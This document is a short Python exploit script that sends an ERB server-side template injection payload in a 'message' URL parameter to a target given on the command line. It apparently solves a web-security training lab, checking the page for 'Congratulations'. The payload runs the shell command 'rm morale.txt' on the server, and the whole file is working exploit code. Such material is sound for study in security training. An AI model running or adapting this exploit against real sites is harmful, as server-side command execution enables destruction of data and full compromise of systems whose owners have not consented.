import requests
import urllib3
from sys import argv
					# disable request warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_website_url():
	if len(argv) != 2:
		print(f"[+] usage {argv[0]} <url>")
		print(f"[+] example {argv[0]} http://example.com")
		exit(-1)
	if argv[1][-1] == '/':
		url = argv[1][:-1]
	else:
		url = argv[1]
	return url

def exploit(url):
	print("[+] Starting attack")
	ssti_payload = '<%= system("rm morale.txt") %>'
	print(f"[+] sending ssti payload : {ssti_payload}")
	params = {"message":ssti_payload}

	r = requests.get(url,params=params)

	r = requests.get(url)
	if 'Congratulations' in r.text:
		print("[+] attack successfully")
	else:
		print("[-] Attack un successfully")


exploit(get_website_url())